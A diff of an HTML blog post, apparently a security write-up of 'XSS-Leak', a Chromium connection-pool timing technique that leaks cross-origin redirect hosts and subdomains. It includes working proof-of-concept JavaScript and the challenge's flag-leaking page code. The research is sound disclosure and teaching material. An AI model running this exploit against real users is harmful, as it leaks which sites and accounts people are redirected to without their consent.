-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">controller</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">block_socket</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">controller</span> <span class="o">=</span> <span class="nx">fetch_sleep_long</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">controller</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">exhaust_sockets</span> <span class="o">=</span> <span class="kr">async</span><span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">SOCKETLIMIT</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">controller</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">block_socket</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">controllers</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">controller</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">async</span> <span class="kd">function</span> <span class="nx">clearIframes</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">iframes</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelectorAll</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">iframes</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">iframe</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;about:blank&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">iframe</span><span class="p">.</span><span class="nx">remove</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">        <span class="p">});</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">async</span> <span class="kd">function</span> <span class="nx">test</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">sb</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">clearIframes</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;block fetch sleep long&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="c1">// 1) exhaust the last socket
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">let</span> <span class="nx">block</span> <span class="o">=</span> <span class="nx">fetch_sleep_long</span><span class="p">(</span><span class="mi">1234</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="c1">// 2) Open `auth.localhost.com/login` in a window
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">w</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="sb">`http://auth.localhost.com/login?</span><span class="si">${</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="c1">// 3) Free exactly one socket and then immediately block it again
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">block</span><span class="p">.</span><span class="nx">abort</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">block</span> <span class="o">=</span> <span class="nx">fetch_sleep_long</span><span class="p">(</span><span class="mi">1234</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="c1">// 4) Trigger a frame navigation to `ajj.attacker.com`
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
-</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">p</span> <span class="o">=</span> <span class="nx">loadIframe</span><span class="p">(</span><span class="sb">`http://</span><span class="si">${</span><span class="nx">sb</span><span class="si">}</span><span class="sb">.</span><span class="si">${</span><span class="nx">MYSERVER</span><span class="si">}</span><span class="sb">/0?</span><span class="si">${</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span> <span class="s2">&#34;win1&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="c1">// 5) Free one socket and then re-block it immediately, forcing a &#34;race&#34; between the pending redirect and our pending frame navigation
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">block</span><span class="p">.</span><span class="nx">abort</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">block</span> <span class="o">=</span> <span class="nx">fetch_sleep_long</span><span class="p">(</span><span class="mi">1234</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="c1">// 6) We send a new frame navigation which will take ~500ms to finish
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">p2</span> <span class="o">=</span> <span class="nx">loadIframe</span><span class="p">(</span><span class="sb">`http://00000000000000000000.</span><span class="si">${</span><span class="nx">MYSERVER</span><span class="si">}</span><span class="sb">/ssleep/500?</span><span class="si">${</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span> <span class="s2">&#34;win2&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="c1">// 7) Finally, free one socket and then re-block it immediately
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">        <span class="nx">block</span><span class="p">.</span><span class="nx">abort</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">block</span> <span class="o">=</span> <span class="nx">fetch_sleep_long</span><span class="p">(</span><span class="mi">1234</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="nx">block</span><span class="p">.</span><span class="nx">abort</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">res</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">p</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">res</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">res</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">async</span> <span class="kd">function</span> <span class="nx">main</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">exhaust_sockets</span><span class="p">()</span> <span class="c1">// Exhaust the entire pool - 1
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">test</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s2">&#34;ajjjjjjj&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">result</span> <span class="o">&gt;</span> <span class="mi">500</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">            <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="sb">`You&#39;re an admin (admin.test.localhost.com)`</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="sb">`You&#39;re a regular user (app.test.localhost.com)`</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        
-</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">main</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">w</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></div>
-<h3 id="poc---admin">
-  <a class="full-clickable-heading" href="#poc---admin">
-    PoC - admin
-  </a>
-</h3>
-
-    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/s6hSHByoAn0?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
-    </div>
-
-
-<h3 id="poc---user">
-  <a class="full-clickable-heading" href="#poc---user">
-    PoC - user
-  </a>
-</h3>
-
-    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/a29-Jlp0a5w?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
-    </div>
-
-
-<h2 id="use-cases">
-  <a class="full-clickable-heading" href="#use-cases">
-    Use cases
-  </a>
-</h2>
-<p>This technique is not limited to leaking subdomains of cross-origin requests but it&rsquo;s useful in several other scenarios:</p>
-<ul>
-<li>Cross-Origin Request Counting: 
-
-  <a href="https://blog.babelo.xyz/posts/css-exfiltration-under-default-src-self/#swimming-in-the-connection-pool-" rel="noopener">https://blog.babelo.xyz/posts/css-exfiltration-under-default-src-self/#swimming-in-the-connection-pool-</a>
-
-</li>
-<li>Delay POST requests: 
-
-  <a href="https://github.com/icesfont/ctf-writeups/tree/main/idekctf/2025#appendix" rel="noopener">https://github.com/icesfont/ctf-writeups/tree/main/idekctf/2025#appendix</a>
-
-</li>
-<li>Leak the scheme of cross-origin requests</li>
-<li>Leak the port of cross-origin requests</li>
-<li>Possibly leak <!-- raw HTML omitted --><code>GroupId.privacy_mode_</code><sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted --> (not verified).</li>
-</ul>
-
-<h2 id="limitations">
-  <a class="full-clickable-heading" href="#limitations">
-    Limitations
-  </a>
-</h2>
-<p>Only works in Chromium-based browsers</p>
-
-<h2 id="conclusion">
-  <a class="full-clickable-heading" href="#conclusion">
-    Conclusion
-  </a>
-</h2>
-<p>This post is a follow-up to my 
-
-  <a href="https://blog.babelo.xyz/posts/css-exfiltration-under-default-src-self/" rel="noopener">previous post</a>
-
- from a few months ago. Since then, I reported the behaviour to Chrome. Because it&rsquo;s essentially a variant of the 
-
-  <a href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/" rel="noopener">classic connection-pool</a>
-
- exhaustion attack, they considered it likely WAI and I don&rsquo;t think will be fixed soon.</p>
-<p>Thanks for reading.</p>
-<div class="footnotes" role="doc-endnotes">
-<hr>
-<ol>
-<li id="fn:1">
-<p>
-
-  <a href="https://source.chromium.org/chromium/chromium/src/&#43;/main:net/socket/client_socket_pool.h;l=162;drc=48d6f7175422b2c969c14258f9f8d5b196c28d18" rel="noopener">https://source.chromium.org/chromium/chromium/src/+/main:net/socket/client_socket_pool.h;l=162;drc=48d6f7175422b2c969c14258f9f8d5b196c28d18</a>
-
-&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-</ol>
-</div></div>
-    </article>
-  </main>
-
-      </div>
-      <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      <br />
-      
-        
-        <a href="https://github.com/salvatore-abello">Github</a>
-      
-         | 
-        <a href="https://www.linkedin.com/in/salvatore-abello/">Linkedin</a>
-      
-         | 
-        <a href="https://x.com/salvatoreabello">X</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2025. All rights deserved.
-  </p>
-  <hr><code>Made with ❤️ by <strong>Salvatore Abello</strong></code> | <a href="/index.xml"><b>RSS</b></a>
-</footer>
-
-    </div>
-  </body>
-</html>
+<!doctype html><html lang=en><head lang=it><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preconnect href=https://blog.babelo.xyz/><link rel=dns-prefetch href=https://blog.babelo.xyz/><meta name=description content="In this post, I will introduce XSS-Leak (&ldquo;Cross-Site-Subdomain Leak&rdquo;), a technique for Chromium-based browsers that leaks cross-origin redirects, …"><title>XSS-Leak: Leaking Cross-Origin Redirects | Salvatore Abello's Blog</title><meta property="og:title" content="XSS-Leak: Leaking Cross-Origin Redirects"><meta property="og:description" content="In this post, I will introduce XSS-Leak (&ldquo;Cross-Site-Subdomain Leak&rdquo;), a technique for Chromium-based browsers that leaks cross-origin redirects, …"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.babelo.xyz/posts/cross-site-subdomain-leak/"><meta property="og:site_name" content="Salvatore Abello's Blog"><meta property="og:image" content="https://blog.babelo.xyz/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"><meta name=twitter:card content="summary"><meta name=twitter:title content="XSS-Leak: Leaking Cross-Origin Redirects"><meta name=twitter:description content="In this post, I will introduce XSS-Leak (&ldquo;Cross-Site-Subdomain Leak&rdquo;), a technique for Chromium-based browsers that leaks cross-origin redirects, …"><meta name=twitter:image content="https://blog.babelo.xyz/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"><meta name=keywords content="Cybersec,Research,client-side,Writeup,Chrome"><meta property="article:published_time" content="2025-09-18T11:15:00+02:00"><meta property="article:modified_time" content="2025-09-18T11:15:00+02:00"><meta property="article:author" content="Salvatore Abello"><link rel=canonical href=https://blog.babelo.xyz/posts/cross-site-subdomain-leak/><style>:root{--bgcolor:#000000;--dimcolor:#333;--fontcolor:#ddd;--linkcolor:#ff00ff;--visitedcolor:#ff00ff;--precolor:#fff;--prebgcolor:#383838}body{color:var(--fontcolor);background:var(--bgcolor);margin:0;font-family:Iosevka,monospace}#root{font-family:Iosevka,monospace;max-width:750px;margin:0 auto;padding:10px}#brand{display:flex;flex-direction:column;align-items:center;text-align:center}#brand a{color:var(--fontcolor);text-decoration:none}#brand h1,#brand h2{margin:0}h1{font-size:1.5rem}#brand h1{font-size:30px;line-height:1.1;min-height:33px}#brand h2{font-size:20px;font-weight:400;line-height:1.2;min-height:24px}#brand .icon{width:75px;height:75px;object-fit:contain;aspect-ratio:1/1}.icon-link{display:block;width:75px;height:75px;flex-shrink:0}a{text-decoration:none;color:var(--linkcolor);word-wrap:break-word;overflow-wrap:break-word;white-space:normal}a:hover{text-decoration:underline}a:visited{color:var(--visitedcolor)}.full-clickable-heading,.full-clickable-heading a{color:var(--linkcolor)!important}img{display:block;max-width:100%;height:auto}header nav{margin:15px 0}nav a{font-weight:700;padding:2px 4px;border:none}nav a:hover,nav a:focus{text-decoration:underline;background-color:rgba(255,255,255,.1)}#content{min-height:50vh}article{padding:5px 0}</style><link rel=preload href=/css/reset.css as=style onload='this.onload=null,this.rel="stylesheet"'><link rel=preload href=/css/font.css as=style onload='this.onload=null,this.rel="stylesheet"'><link rel=preload href=/css/smigle.css as=style onload='this.onload=null,this.rel="stylesheet"'><link rel=preload href=/css/syntax.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/font.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/syntax.css></noscript><link rel=preload href=/fonts/iosevka-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/iosevka-bold.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/iosevka-oblique.woff2 as=font type=font/woff2 crossorigin><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><div id=root><header><div id=brand><a class=icon-link href=https://blog.babelo.xyz/ aria-label="Go to homepage"><img class=icon src=/images/65adf8e914bdc50b5f5f2e8b91b68cb1_hu_7b9be87489d5b961.webp alt="Salvatore Abello's Blog logo" width=75 height=75 loading=eager fetchpriority=high></a><div class=text><a href=https://blog.babelo.xyz/><h1>Salvatore Abello's Blog</h1></a><h2>Hacking & other stuff</h2></div></div><nav><a class=nav-link href=/><b>Home</b></a>
+|
+<a class=nav-link href=/whoami/><b>Whoami</b></a>
+|
+<a class=nav-link href=/achievements/><b>Achievements</b></a>
+|
+<a class=nav-link href=/posts/><b>Posts</b></a>
+|
+<a class=nav-link href=/cves/><b>CVEs</b></a></nav><hr></header><div id=content><main><article><h1 class=title>XSS-Leak: Leaking Cross-Origin Redirects</h1><div class=post-meta><strong><span>Posted on</span>
+<time>2025-09-18 11:15:00</time>
+</strong><span>• 2076 words</span>
+<span>• 10 minute read</span><div><span>Tags:</span>
+<a href=/tags/cybersec>Cybersec</a>,
+<a href=/tags/research>Research</a>,
+<a href=/tags/client-side>client-side</a>,
+<a href=/tags/writeup>Writeup</a>,
+<a href=/tags/chrome>Chrome</a></div></div><div class=content><p>In this post, I will introduce <code>XSS-Leak</code> (&ldquo;Cross-Site-Subdomain Leak&rdquo;), a technique for Chromium-based browsers that leaks cross-origin redirects, <code>fetch()</code> destinations, and more. I use the name <code>XSS-Leak</code> because the original goal was to leak subdomains of cross-origin requests, as I&rsquo;ll explain later.</p><h2 id=index><a class=full-clickable-heading href=#index>Index</a></h2><ul><li><a href=#index>Index</a></li><li><a href=#challenge-overview>Challenge Overview</a><ul><li><a href=#route->Route /</a></li><li><a href=#content-security-policy>Content Security Policy</a></li><li><a href=#route-report>Route /report</a></li></ul></li><li><a href=#swimming-in-the-connection-pool-again>Swimming in the connection pool (again)</a></li><li><a href=#exploit---leaking-subdomains-of-cross-origin-requests>Exploit - Leaking subdomains of cross-origin requests</a><ul><li><a href=#poc>PoC</a></li></ul></li><li><a href=#leaking-redirect-hosts>Leaking redirect hosts</a><ul><li><a href=#poc---admin>PoC - Admin</a></li><li><a href=#poc---user>PoC - User</a></li></ul></li><li><a href=#use-cases>Use Cases</a></li><li><a href=#limitations>Limitations</a></li><li><a href=#conclusion>Conclusion</a></li></ul><p>A few months ago I found a cool way to leak subdomains from cross-origin (no injection required), so I created a small challenge and posted it on X.</p><p>Only two people managed to get the flag: 🩸 first blood to
+<a href=https://x.com/0xAl3ssandro rel=noopener>0xAl3ssandro</a>
+and the second solve to
+<a href=https://x.com/J0R1AN/ rel=noopener>J0R1AN</a>
+, congrats!</p><h2 id=challenge-overview><a class=full-clickable-heading href=#challenge-overview>Challenge Overview</a></h2><p>We&rsquo;re given a minimal Express app which exposes two routes:</p><ul><li><code>/</code>, serves a page with an inline script</li><li><code>/report</code>, triggers a visit from a headless Chrome bot</li></ul><h3 id=route-><a class=full-clickable-heading href=#route->Route /</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>challenge-01<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>p</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;result&#34;</span><span class=p>&gt;</span>Hello World!<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>nonce</span><span class=o>=</span><span class=s>&#34;&lt;%= nonce %&gt;&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>DOMAIN</span> <span class=o>=</span> <span class=s2>&#34;&lt;%= DOMAIN %&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>PORT</span> <span class=o>=</span> <span class=s2>&#34;&lt;%= PORT %&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>result</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;result&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>toHex</span> <span class=o>=</span> <span class=nx>s</span> <span class=p>=&gt;</span> <span class=p>[...</span><span class=k>new</span> <span class=nx>TextEncoder</span><span class=p>().</span><span class=nx>encode</span><span class=p>(</span><span class=nx>s</span><span class=p>)].</span><span class=nx>map</span><span class=p>(</span><span class=nx>b</span> <span class=p>=&gt;</span> <span class=nx>b</span><span class=p>.</span><span class=nx>toString</span><span class=p>(</span><span class=mi>16</span><span class=p>).</span><span class=nx>padStart</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>)).</span><span class=nx>join</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nb>window</span><span class=p>.</span><span class=nx>onhashchange</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>flag</span> <span class=o>=</span> <span class=nx>localStorage</span><span class=p>.</span><span class=nx>getItem</span><span class=p>(</span><span class=s2>&#34;flag&#34;</span><span class=p>)</span> <span class=o>||</span> <span class=s2>&#34;flag{fake_flag_for_testing}&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>fetch</span><span class=p>(</span><span class=sb>`http://</span><span class=si>${</span><span class=nx>toHex</span><span class=p>(</span><span class=nx>flag</span><span class=p>)</span><span class=si>}</span><span class=sb>.</span><span class=si>${</span><span class=nx>DOMAIN</span><span class=si>}</span><span class=sb>:</span><span class=si>${</span><span class=nx>PORT</span><span class=si>}</span><span class=sb>`</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=p>.</span><span class=k>finally</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=nx>result</span><span class=p>.</span><span class=nx>innerText</span> <span class=o>=</span> <span class=s2>&#34;request sent&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
+</span></span></code></pre></div><p>When <code>location.hash</code> changes, the page:</p><ul><li>Reads <code>flag</code> from <code>localStorage</code> and hex-encodes it</li><li>Sends a request to <code>http://&lt;hex(flag)>.${DOMAIN}:${PORT}</code> (<code>DOMAIN = challenge-01.babelo.xyz</code> and <code>PORT = 80</code>)</li><li>Prints <code>request sent</code></li></ul><style type=text/css>.notice{--title-color:#fff;--title-background-color:#6be;--content-color:#444;--content-background-color:#e7f2fa}.notice.info{--title-background-color:#fb7;--content-background-color:#fec}.notice.tip{--title-background-color:#5a5;--content-background-color:#efe}.notice.warning{--title-background-color:#c33;--content-background-color:#fee}@media(prefers-color-scheme:dark){.notice{--title-color:#fff;--title-background-color:#069;--content-color:#ddd;--content-background-color:#023}.notice.info{--title-background-color:#a50;--content-background-color:#420}.notice.tip{--title-background-color:#363;--content-background-color:#121}.notice.warning{--title-background-color:#800;--content-background-color:#400}}body.dark .notice{--title-color:#fff;--title-background-color:#069;--content-color:#ddd;--content-background-color:#023}body.dark .notice.info{--title-background-color:#a50;--content-background-color:#420}body.dark .notice.tip{--title-background-color:#363;--content-background-color:#121}body.dark .notice.warning{--title-background-color:#800;--content-background-color:#400}.notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:var(--content-color);background:var(--content-background-color)}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:var(--title-color);background:var(--title-background-color)}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline svg{top:.125em;position:relative}</style><div class="notice note"><p class=notice-title><span class="icon-notice baseline"><svg viewBox="0 128 300 300"><path d="M150 128c82.813.0 150 67.188 150 150 0 82.813-67.188 150-150 150C67.187 428 0 360.812.0 278c0-82.813 67.188-150 150-150zm25 243.555v-37.11c0-3.515-2.734-6.445-6.055-6.445h-37.5c-3.515.0-6.445 2.93-6.445 6.445v37.11c0 3.515 2.93 6.445 6.445 6.445h37.5c3.32.0 6.055-2.93 6.055-6.445zm-.39-67.188 3.515-121.289c0-1.367-.586-2.734-1.953-3.516-1.172-.976-2.93-1.562-4.688-1.562h-42.968c-1.758.0-3.516.586-4.688 1.563-1.367.78-1.953 